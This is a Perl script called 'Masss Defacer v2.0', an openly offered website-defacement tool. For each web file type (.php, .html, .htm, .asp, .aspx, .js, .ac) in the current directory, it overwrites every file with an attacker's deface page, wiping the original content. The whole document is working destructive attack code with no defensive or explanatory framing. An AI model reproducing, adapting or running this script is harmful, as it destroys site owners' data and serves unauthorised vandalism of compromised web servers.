#!/usr/bin/perl -w 
#Masss Defacer v2.0 
# Coded By illuz1oN 
# Creditz - Nostur 
$def = 'YOUR LAME DEFACE PAGE HERE =)'; 
{        print "[+]DEFACING...\n"; 
         print"[+]DEFACING .PHP FILES...\n"; 
		 my @php = glob("*.php"); #Files 
     foreach my $deface(@php){ 
     open(DEFACE, '>', $deface); 
     print DEFACE $def || print "[-]Fxcked up: $!\n"; 
     close(DEFACE) 
  } 
         print "[+]DEFACING .HTML FILES...\n"; 
         my @html = glob("*.html"); #Files 
     foreach my $deface(@html){ 
     open(DEFACE, '>', $deface); 
     print DEFACE $def || print "[-]Fxcked up: $!\n"; 
     close(DEFACE) 
  } 
         print "[+]DEFACING .ASP FILES...\n"; 
		 my @asp = glob("*.asp"); #Files 
     foreach my $deface(@asp){ 
     open(DEFACE, '>', $deface); 
     print DEFACE $def || print "[-]Fxcked up: $!\n"; 
     close(DEFACE) 
  } 
         print "[+]DEFACING .ASPX FILES...\n"; 
		 my @aspx = glob("*.aspx"); #Files 
     foreach my $deface(@aspx){ 
     open(DEFACE, '>', $deface); 
     print DEFACE $def || print "[-]Fxcked up: $!\n"; 
     close(DEFACE) 
  } 
         print "[+]DEFACING .HTM FILES...\n"; 
		my @htm = glob("*.htm"); #Files 
     foreach my $deface(@htm){ 
     open(DEFACE, '>', $deface); 
     print DEFACE $def || print "[-]Fxcked up: $!\n"; 
     close(DEFACE) 
  } 
         print "[+]DEFACING .JS FILES...\n"; 
	my @js = glob("*.js"); #Files 
     foreach my $deface(@js){ 
     open(DEFACE, '>', $deface); 
     print DEFACE $def || print "[-]Fxcked up: $!\n"; 
     close(DEFACE) 
  } 
         print "[+]DEFACING .AC FILES...\n"; 
		 my @ac = glob("*.ac"); #Files 
     foreach my $deface(@ac){ 
     open(DEFACE, '>', $deface); 
     print DEFACE $def || print "[-]Fxcked up: $!\n"; 
     close(DEFACE) 
  } 
  print "[+]Pages Should Be Defaced!\n"; 
 
} 
#Coded By illuz1oN 
#Credits - Nostur! 